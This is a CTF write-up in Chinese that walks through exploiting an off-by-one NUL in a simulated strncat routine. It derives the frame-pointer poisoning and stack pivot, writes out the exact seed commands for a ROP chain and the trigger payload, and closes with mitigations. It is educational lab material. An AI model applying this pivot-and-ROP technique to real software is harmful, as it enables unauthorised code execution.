# CTF 练习：poison-null-frame（帧指针毒化与栈迁移）

> 平台：CTF² / Daily Hack（Pwn · Medium · 300 分）
> 环境：Kali Linux，明文 TCP 对话终端（`nc`）
> 日期：2026-11-17
> 性质：平台提供的授权靶场

---

## 一、目标

靶机用 Python 模拟 x86-64 栈帧语义。`fill()` 按 `strncat` 语义复制 0x20 字节后追加 `NUL`，恰好毒化保存的 RBP 最低字节，`leave;ret` 触发栈迁移。需要在迁移后的可控栈区布置短 ROP 链，调用 `win` 输出 FLAG。

## 二、环境

```bash
nc direct-ctf2.dasctf.com 25274
```

菜单（明文）：

| 命令 | 作用 |
|---|---|
| `disasm` | 显示 `fill()` 帧布局与 gadget 地址 |
| `leak` | 泄漏上一次 helper() 的旧 RBP |
| `seed <hexaddr> <hexword>` | 向模拟栈写入 8 字节 |
| `trig <hexpayload>` | 触发 fill（写入 payload） |
| `quit` | 退出 |

## 三、侦察

### 3.1 disasm

```
fill():
  push rbp ; mov rbp,rsp ; sub rsp,0x20   ; buf=rbp-0x20 (0x20 bytes)
  ... strncat(buf, src, 0x20) ...          ; writes 0x20 bytes + trailing NUL
  leave ; ret                               ; rsp=rbp; pop rbp; ret
helper(): push rbp; mov rbp,rsp; sub rsp,0x40 ; canary @ rbp-0x8
gadgets: 0x401230 ret | 0x401234 pop rdi;ret | 0x4017a0 win | 0x4017c0 win_alt
```

关键点：
- `buf = rbp-0x20`，**恰好写满 0x20 字节**
- `strncat` 在末尾补的 `NUL` 落在 `[rbp]`，也就是**保存的 RBP 最低字节**
- 结束后 `leave;ret`

### 3.2 leak

```
stale frame value from previous helper() call: rbp=0x7ffd0210
```

### 3.3 诱饵

`win_alt`（0x4017c0）要求 `RSI=0xDEAD`，但 gadget 列表里**没有 `pop rsi`**，无法满足 → 诱饵。

## 四、推导栈迁移

```
旧 RBP = 0x7ffd0210
NUL 覆盖最低字节 0x10 → 0x00
→ 被毒化的 RBP = 0x7ffd0200
```

执行流：

```
fill 的 leave;ret:
  rbp = [fill_rbp] = 0x7ffd0200
  ret 到 helper 的返回地址

helper 的 leave;ret:
  rsp = rbp = 0x7ffd0200
  pop rbp  ← 读 [0x7ffd0200]
  ret      ← 读 [0x7ffd0208]  ← ROP 链从这里开始
```

**结论：ROP 链起始于 `0x7ffd0208`。**

## 五、布置 ROP 链

目标调用：`win(rdi = "flag")`。

| 地址 | 值 | 作用 |
|---|---|---|
| `0x7ffd0208` | `0x401234` | `pop rdi; ret` |
| `0x7ffd0210` | `0x7ffd0300` | RDI 指向 "flag" 字符串 |
| `0x7ffd0218` | `0x4017a0` | `win` |
| `0x7ffd0300` | `0x67616c66` | 小端字节 `66 6c 61 67` = `"flag"`，后接 00 |

写入命令：

```
seed 0x7ffd0208 0x401234
seed 0x7ffd0210 0x7ffd0300
seed 0x7ffd0218 0x4017a0
seed 0x7ffd0300 0x67616c66
```

## 六、触发

`trig` 的 payload 必须**恰好 0x20 字节**，这样 `NUL` 才会落在保存的 RBP 上：

```
trig 4141414141414141414141414141414141414141414141414141414141414141
```

（32 字节 `0x41`，64 个十六进制字符，**不带 `0x` 前缀**）

输出：

```
FLAG=CTF2{...}
```

## 七、原理

1. **off-by-one NUL**：`strncat` 的边界计算错误，把结尾 `NUL` 写到了保存的 RBP 上。
2. **帧指针毒化**：只改了最低字节（对齐），但足以把 RBP 指向「上一页」的可控区域。
3. **栈迁移**：`leave;ret` 链式执行时，用被毒化的 RBP 重设 RSP，控制流跳到攻击者布置的 ROP 链。
4. **ROP**：栈不可执行时，用 `pop rdi; ret` + `win` 完成调用。

## 八、修复

| 措施 | 说明 |
|---|---|
| 修正长度计算 | `strncat` 的第 3 参数要减去已写长度，确保结尾 NUL 在缓冲区内 |
| 用 `strlcpy` / `snprintf` | 明确边界，避免 off-by-one |
| 栈保护 | `-fstack-protector-all`，破坏 RBP 会触发 canary 检查 |
| 栈不可执行 | NX/ASLR 常规防护 |
| 代码审计 | 重点检查 `strncat`、`strcpy`、`memcpy` 的长度参数 |

## 九、踩坑

1. **`trig` 不认 `0x` 前缀**：`seed` 接受 `0x`，但 `trig` 报 `bad hex`，去掉前缀即可。
2. **payload 必须正好 0x20 字节**：短了 NUL 落不到 saved RBP，长了会被截断。
3. **迁移落点差 8 字节**：ROP 链从 `0x7ffd0208` 开始，不是 `0x7ffd0200`（后者被 `pop rbp` 吃掉）。
4. **别选 win_alt**：没有 `pop rsi`，条件永远不满足。

## 十、收获

- 亲手推演了一次 `leave;ret` 的栈迁移过程。
- 理解了「单字节 NUL 覆盖」为什么能把栈指针搬走。
- 学会 `seed` + `trig` 这种模拟靶机的调试方式：先侦察、再布置、最后触发。
